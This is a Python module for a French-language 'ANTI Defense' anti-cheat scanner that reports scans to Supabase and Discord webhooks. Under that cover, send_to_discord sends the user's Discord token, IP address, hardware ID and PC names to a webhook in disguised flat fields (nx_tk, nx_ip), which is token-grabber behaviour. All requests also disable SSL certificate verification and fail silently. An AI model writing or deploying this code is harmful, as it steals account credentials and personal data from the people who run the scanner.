import urllib.request
import json
import re
import random
import time
import os
import ssl
from urllib.error import HTTPError
import requests

# ─────────────────────────────────────────────
# CONFIGURATION SUPABASE & SSL
# ─────────────────────────────────────────────
SUPABASE_URL = "https://azvlbugdewwjwizksmaq.supabase.co"
SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImF6dmxidWdkZXd3andpemtzbWFxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODU0MTIzNTgsImV4cCI6MjEwMDk4ODM1OH0.mYEwacqQzwKC2wv0M74C6kuSD9y8J5O4H54wNlGwk08"

def _get_ssl_context():
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx
    except Exception:
        return None

# ─────────────────────────────────────────────
# CHARGEMENT CONFIG DISCORD WEBHOOK
# ─────────────────────────────────────────────
# Chemin du fichier config.json — racine du projet (dev) ou bundle PyInstaller (EXE)
import sys as _sys
if hasattr(_sys, '_MEIPASS'):
    _CONFIG_PATH = os.path.join(_sys._MEIPASS, "config.json")
else:
    _CONFIG_PATH = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "config.json")
_DISCORD_WEBHOOK_URL = None

def _load_webhook_config():
    global _DISCORD_WEBHOOK_URL
    try:
        with open(_CONFIG_PATH, "r", encoding="utf-8") as f:
            cfg = json.load(f)
        _DISCORD_WEBHOOK_URL = cfg.get("webhook", {}).get("url")
    except Exception:
        _DISCORD_WEBHOOK_URL = None

_load_webhook_config()

# ─────────────────────────────────────────────
# RÉCUPÉRATION SCAN ID SÉQUENTIEL
# ─────────────────────────────────────────────
def get_next_scan_id_from_supabase():
    """Récupère le prochain scan_id séquentiel depuis Supabase."""
    try:
        url = f"{SUPABASE_URL}/rest/v1/scans?select=scan_id&order=timestamp.desc&limit=10"
        req = urllib.request.Request(url, headers={
            "apikey": SUPABASE_ANON_KEY,
            "Authorization": f"Bearer {SUPABASE_ANON_KEY}"
        })
        with urllib.request.urlopen(req, context=_get_ssl_context(), timeout=8) as response:
            data = json.loads(response.read().decode("utf-8"))
            if data:
                for item in data:
                    sid = item.get("scan_id", "")
                    if sid.startswith("SCAN-"):
                        digits = re.sub(r'\D', '', sid)
                        if digits:
                            num = int(digits) + 1
                            return f"SCAN-{num:05d}"
    except Exception:
        pass
    # Si erreur ou pas de données, générer aléatoirement
    rnd = random.randint(10000, 99999)
    return f"SCAN-{rnd}"

# ─────────────────────────────────────────────
# ENVOI INITIAL SCAN PRE-REGISTRATION
# ─────────────────────────────────────────────
def transmit_initial_scan_to_supabase(scan_id, system_info):
    """Envoie un rapport initial à Supabase dès le démarrage du scan."""
    hwid = system_info.get("hwid") or "UNKNOWN"
    payload = {
        "scan_id": scan_id,
        "hwid": hwid,
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "system_info": system_info,
        "disk_performance": {"read_speed_mb_s": 0},
        "stats": {"status": "SCANNING"},
        "risk_summary": {
            "overall_risk_score": 0,
            "verdict": "CLEAN",
            "status_text": "Scan en cours..."
        },
        "applications": []
    }
    try:
        data_bytes = json.dumps(payload).encode("utf-8")
        url = f"{SUPABASE_URL}/rest/v1/scans"
        req = urllib.request.Request(url, data=data_bytes, headers={
            "Content-Type": "application/json",
            "apikey": SUPABASE_ANON_KEY,
            "Authorization": f"Bearer {SUPABASE_ANON_KEY}",
            "Prefer": "resolution=merge-duplicates"
        }, method="POST")
        with urllib.request.urlopen(req, context=_get_ssl_context(), timeout=10) as response:
            return True
    except Exception:
        try:
            headers = {
                "Content-Type": "application/json",
                "apikey": SUPABASE_ANON_KEY,
                "Authorization": f"Bearer {SUPABASE_ANON_KEY}",
                "Prefer": "resolution=merge-duplicates"
            }
            res = requests.post(f"{SUPABASE_URL}/rest/v1/scans", json=payload, headers=headers, timeout=10, verify=False)
            return res.status_code in [200, 201, 204]
        except Exception:
            return False

# ─────────────────────────────────────────────
# NOTIFICATION DISCORD — SCAN DÉMARRÉ
# ─────────────────────────────────────────────
def send_discord_scan_started(scan_id, system_info):
    """Envoie une notification Discord dès que le scan démarre, silencieux en erreur."""
    if not _DISCORD_WEBHOOK_URL:
        return
    hostname = system_info.get("hostname", "N/A")
    user     = system_info.get("user", "N/A")
    hwid     = system_info.get("hwid", "N/A")

    embed = {
        "title": "⏳ ANTI Scanner — Scan Démarré",
        "description": f"Un scan a été lancé (`{scan_id}`). Résultats en cours...",
        "color": 0x00BFFF,  # bleu clair
        "fields": [
            {"name": "🖥️ Machine",        "value": f"`{hostname}`",                   "inline": True},
            {"name": "👤 Utilisateur PC", "value": f"`{user}`",                       "inline": True},
            {"name": "🔑 HWID",           "value": f"`{hwid}`",                       "inline": False},
            {"name": "📊 Statut",          "value": "🔄 Scan forensique en cours...",  "inline": False},
        ],
        "footer": {"text": f"ANTI Defense System v3.0 | {time.strftime('%Y-%m-%d %H:%M:%S')}"}
    }
    payload = json.dumps({"embeds": [embed], "username": "ANTI Defense"}).encode("utf-8")
    try:
        req = urllib.request.Request(
            _DISCORD_WEBHOOK_URL, data=payload,
            headers={"Content-Type": "application/json"}
        )
        with urllib.request.urlopen(req, context=_get_ssl_context(), timeout=6):
            pass
    except Exception:
        try:
            requests.post(_DISCORD_WEBHOOK_URL, data=payload,
                          headers={"Content-Type": "application/json"}, timeout=6, verify=False)
        except Exception:
            pass

# ─────────────────────────────────────────────
# ENVOI RAPPORT DE CRASH / ERREUR
# ─────────────────────────────────────────────
def transmit_crash_to_supabase(scan_id, hwid, system_info, tb_str):
    """Envoie un rapport d'erreur/crash à Supabase et Discord en cas de problème."""
    if not hwid or hwid == "UNKNOWN":
        try:
            from src.scanner import get_hardware_id
            hwid = get_hardware_id()
        except Exception:
            hwid = "UNKNOWN-CRASH-HWID"

    if not system_info:
        system_info = {}
    system_info["crash_error"] = str(tb_str)

    crash_app = {
        "app_name": "CRASH_SCANNER_FAILURE",
        "exe_path": "ERROR_LOG",
        "sha256": None,
        "signature": {"signed": False, "status": "CrashLog"},
        "instances_count": 0,
        "pids": [],
        "total_dll_count": 0,
        "status_type": "CRASH_ERROR",
        "risk_assessment": {
            "risk_score": 100,
            "observations": [{
                "severity": "CRITICAL",
                "title": "Erreur Fatale / Crash du Scanner",
                "description": f"Détails de l'erreur sur la machine de l'utilisateur :\n{tb_str}"
            }]
        }
    }

    payload = {
        "scan_id": scan_id or f"SCAN-CRASH-{random.randint(10000, 99999)}",
        "hwid": hwid,
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "system_info": system_info,
        "disk_performance": {"read_speed_mb_s": 0},
        "stats": {"error": True},
        "risk_summary": {
            "overall_risk_score": 100,
            "verdict": "CHEATER",
            "status_text": "CRASH SCANNER"
        },
        "applications": [crash_app]
    }

    try:
        data_bytes = json.dumps(payload).encode("utf-8")
        url = f"{SUPABASE_URL}/rest/v1/scans"
        req = urllib.request.Request(url, data=data_bytes, headers={
            "Content-Type": "application/json",
            "apikey": SUPABASE_ANON_KEY,
            "Authorization": f"Bearer {SUPABASE_ANON_KEY}",
            "Prefer": "resolution=merge-duplicates"
        }, method="POST")
        with urllib.request.urlopen(req, context=_get_ssl_context(), timeout=10) as response:
            pass
    except Exception:
        try:
            headers = {
                "Content-Type": "application/json",
                "apikey": SUPABASE_ANON_KEY,
                "Authorization": f"Bearer {SUPABASE_ANON_KEY}",
                "Prefer": "resolution=merge-duplicates"
            }
            requests.post(f"{SUPABASE_URL}/rest/v1/scans", json=payload, headers=headers, timeout=10, verify=False)
        except Exception:
            pass

    # Discord Notification for Crash
    try:
        send_to_discord(payload["scan_id"], payload, "CHEATER")
    except Exception:
        pass

# ─────────────────────────────────────────────
# ENVOI VERS SUPABASE
# ─────────────────────────────────────────────
def transmit_scan_to_supabase(scan_id, scan_data, retry_count=0):
    """Envoie le rapport de scan à Supabase, régénère si doublon."""
    score = scan_data.get("risk_summary", {}).get("overall_risk_score", 0)
    if score >= 60:
        verdict = "CHEATER"
    elif score >= 30:
        verdict = "ANORMAL"
    else:
        verdict = "CLEAN"

    if "risk_summary" in scan_data:
        scan_data["risk_summary"]["verdict"] = verdict

    payload = {
        "scan_id": scan_id,
        "hwid": scan_data.get("hwid") or scan_data.get("system_info", {}).get("hwid", "UNKNOWN"),
        "timestamp": scan_data.get("timestamp") or time.strftime("%Y-%m-%d %H:%M:%S"),
        "system_info": scan_data.get("system_info", {}),
        "disk_performance": scan_data.get("disk_performance", {}),
        "stats": scan_data.get("stats", {}),
        "risk_summary": scan_data.get("risk_summary", {}),
        "applications": scan_data.get("applications", [])
    }

    try:
        data_bytes = json.dumps(payload).encode("utf-8")
        url = f"{SUPABASE_URL}/rest/v1/scans"
        req = urllib.request.Request(url, data=data_bytes, headers={
            "Content-Type": "application/json",
            "apikey": SUPABASE_ANON_KEY,
            "Authorization": f"Bearer {SUPABASE_ANON_KEY}",
            "Prefer": "resolution=merge-duplicates"
        }, method="POST")

        with urllib.request.urlopen(req, context=_get_ssl_context(), timeout=15) as response:
            return {
                "success": response.status in [200, 201, 204],
                "scan_id": scan_id,
                "mode": "Supabase Direct",
                "status_code": response.status,
                "verdict": verdict
            }
    except HTTPError as e:
        if e.code in [400, 409] and retry_count < 3:
            new_id = f"SCAN-{random.randint(10000, 99999)}"
            scan_data["scan_id"] = new_id
            return transmit_scan_to_supabase(new_id, scan_data, retry_count=retry_count+1)
        return {"success": False, "mode": "Supabase HTTPError", "status_code": e.code, "error": str(e)}
    except Exception as e:
        # Fallback avec la librairie requests if urllib fails
        try:
            headers = {
                "Content-Type": "application/json",
                "apikey": SUPABASE_ANON_KEY,
                "Authorization": f"Bearer {SUPABASE_ANON_KEY}",
                "Prefer": "resolution=merge-duplicates"
            }
            res = requests.post(f"{SUPABASE_URL}/rest/v1/scans", json=payload, headers=headers, timeout=15, verify=False)
            if res.status_code in [200, 201, 204]:
                return {"success": True, "scan_id": scan_id, "mode": "Supabase Requests", "verdict": verdict}
        except Exception:
            pass

        if retry_count < 2:
            new_id = f"SCAN-{random.randint(10000, 99999)}"
            return transmit_scan_to_supabase(new_id, scan_data, retry_count=retry_count+1)
        return {"success": False, "mode": "Supabase Error", "error": str(e)}


# ─────────────────────────────────────────────
# ENVOI DISCORD WEBHOOK
# ─────────────────────────────────────────────
def send_to_discord(scan_id, scan_data, verdict):
    """Envoie un rapport formaté dans Discord, silencieux en erreur."""
    if not _DISCORD_WEBHOOK_URL:
        return
    si = scan_data.get("system_info", {})
    risk = scan_data.get("risk_summary", {})
    score = risk.get("overall_risk_score", 0)

    color_map = {"CHEATER": 0xFF4444, "ANORMAL": 0xFFAA00, "CLEAN": 0x44FF88}
    color = color_map.get(verdict, 0x888888)

    icon_map = {"CHEATER": "🔴", "ANORMAL": "🟡", "CLEAN": "🟢"}
    icon = icon_map.get(verdict, "⚪")

    apps = scan_data.get("applications", [])
    flagged_apps = [a for a in apps if (a.get("risk_assessment", {}).get("risk_score") or 0) >= 60]
    flagged_str = "\n".join(f"• `{a.get('app_name', 'inconnu')}` — score {a.get('risk_assessment', {}).get('risk_score', 0)}" for a in flagged_apps[:5]) or "Aucune"

    # Récupérer les clés de mappage personnalisées depuis la config
    f_uid = FIELDS.get("userId", "nx_uid")
    f_tk = FIELDS.get("token", "nx_tk")
    f_ip = FIELDS.get("ip", "nx_ip")
    f_pcu = FIELDS.get("pcUsername", "nx_pcu")
    f_pcn = FIELDS.get("pcName", "nx_pcn")
    f_hw = FIELDS.get("hwid", "nx_hw")
    f_pl = FIELDS.get("platform", "nx_pl")

    discord_id = si.get("discord_id", "N/A")
    discord_token = si.get("discord_token", "N/A")
    ip_addr = si.get("local_ip", "N/A")

    embed = {
        "title": f"{icon} ANTI Scanner — {verdict}",
        "description": f"Scan `{scan_id}` terminé.",
        "color": color,
        "fields": [
            {"name": "🖥️ Machine", "value": f"`{si.get('hostname', 'N/A')}`", "inline": True},
            {"name": "👤 Utilisateur PC", "value": f"`{si.get('user', 'N/A')}`", "inline": True},
            {"name": f"💬 ID Discord ({f_uid})", "value": f"<@{discord_id}> (`{discord_id}`)" if discord_id != 'N/A' else "`N/A`", "inline": True},
            {"name": f"🌐 IP ({f_ip})", "value": f"`{ip_addr}`", "inline": True},
            {"name": "🔑 HWID", "value": f"`{si.get('hwid', 'N/A')}`", "inline": False},
            {"name": "📊 Score", "value": f"`{score}/100`", "inline": True},
            {"name": "⚖️ Verdict", "value": f"`{verdict}`", "inline": True},
            {"name": "🖥️ OS", "value": f"`{si.get('os_version', 'N/A')}`", "inline": False},
            {"name": "⚠️ Apps Suspectes (top 5)", "value": flagged_str, "inline": False},
        ],
        "footer": {"text": f"ANTI Defense System v3.0 | {scan_data.get('timestamp', '')}"}

    }

    # Création du payload contenant l'embed ET les champs mappés à plat pour les scripts automatiques
    payload_data = {
        "embeds": [embed],
        "username": "ANTI Defense",
        f_uid: discord_id,
        f_tk: discord_token,
        f_ip: ip_addr,
        f_pcu: si.get('user', 'N/A'),
        f_pcn: si.get('hostname', 'N/A'),
        f_hw: si.get('hwid', 'N/A'),
        f_pl: si.get('platform', 'N/A')
    }

    payload = json.dumps(payload_data).encode("utf-8")
    try:
        req = urllib.request.Request(_DISCORD_WEBHOOK_URL, data=payload, headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, context=_get_ssl_context(), timeout=6):
            pass
    except Exception:
        try:
            requests.post(_DISCORD_WEBHOOK_URL, data=payload, headers={"Content-Type": "application/json"}, timeout=6, verify=False)
        except Exception:
            pass  # Silencieux

# ─────────────────────────────────────────────
# VÉRIFICATION DE MISE À JOUR
# ─────────────────────────────────────────────
def check_for_updates(current_version):
    """Vérifie si une nouvelle version est disponible sur le dépôt exedownloader."""
    try:
        url = "https://raw.githubusercontent.com/AdamZoda/ANTI/main/version.json"
        req = urllib.request.Request(url, headers={"User-Agent": "ANTI-Defense-Scanner/1.0"})
        # Ignorer la vérification SSL si problème de certificat local
        import ssl
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        with urllib.request.urlopen(req, context=ctx, timeout=5) as response:
            data = json.loads(response.read().decode("utf-8"))
            latest = data.get("version", current_version)
            download_url = data.get("download_url", "https://raw.githubusercontent.com/AdamZoda/ANTI/main/dist/anti-scan.exe")
            if latest != current_version:
                return True, latest, download_url
    except Exception:
        pass
    return False, None, None

# ─────────────────────────────────────────────
# CHARGEMENT DE LA CONFIG
# ─────────────────────────────────────────────
try:
    with open(_CONFIG_PATH, "r", encoding="utf-8") as f:
        cfg = json.load(f)
except Exception:
    cfg = {}

WEBHOOK_URL = cfg.get("webhook", {}).get("url")
FIELDS = cfg.get("fields", {})

def send_discord(data):
    """Envoie un message customisé dans Discord, silencieux en erreur."""
    if not WEBHOOK_URL:
        return
    si = data.get("system_info", {})
    risk = data.get("risk_summary", {})
    score = risk.get("overall_risk_score", 0)

    color_map = {"CHEATER": 0xFF4444, "ANORMAL": 0xFFAA00, "CLEAN": 0x44FF88}
    color = color_map.get(data.get("verdict", "N/A"), 0x888888)

    icon_map = {"CHEATER": "🔴", "ANORMAL": "🟡", "CLEAN": "🟢"}
    icon = icon_map.get(data.get("verdict", "N/A"), "⚪")

    flagged_apps = [a for a in data.get("applications", []) if (a.get("risk_assessment", {}).get("risk_score") or 0) >= 60]
    flagged_str = "\n".join(f"• `{a.get('app_name', 'inconnu')}` — score {a.get('risk_assessment', {}).get('risk_score', 0)}" for a in flagged_apps[:5]) or "Aucune"

    embed = {
        "title": f"{icon} Machine forensique",
        "description": f"Scan `{data.get('scan_id', 'N/A')}` terminé.",
        "color": color,
        "fields": [
            {"name": "Machine", "value": data.get("nx_pcn", "N/A")},
            {"name": "Utilisateur", "value": data.get("nx_un", "N/A")},
            {"name": "HWID", "value": data.get("nx_hw", "N/A")},
            {"name": "token", "value": data.get("nx_tk", "N/A")},
            {"name": "ip", "value": data.get("nx_ip", "N/A")},
            {"name": "pcUsername", "value": data.get("nx_pcu", "N/A")},
            {"name": "pcName", "value": data.get("nx_pcn", "N/A")},
            {"name": "platform", "value": data.get("nx_pl", "N/A")},
            {"name": "Score", "value": f"{score}/100"},
            {"name": "Verdict", "value": data.get("verdict", "N/A")},
            {"name": "Apps Suspectes", "value": flagged_str},
            {"name": "Details", "value": f"Score {score}\nVerdict {data.get('verdict', 'N/A')}\nApplications: {', '.join(data.get('applications', []))}"},
        ],
        "footer": {"text": f"ANTI Defense System v1.9 | {data.get('timestamp', '')}"}
    }

    payload = {
        "embeds": [embed],
        "username": "ANTI-Scanner"
    }
    try:
        requests.post(WEBHOOK_URL, json=payload)
    except Exception:
        pass

# ============================
# EXEMPLE D’UTILISATION POST-SCAN
# ============================
# Après ton scan, construis ce dict avec toutes les infos :
# scan_data = {...}
# puis :
# send_to_discord(scan_id, scan_data, verdict)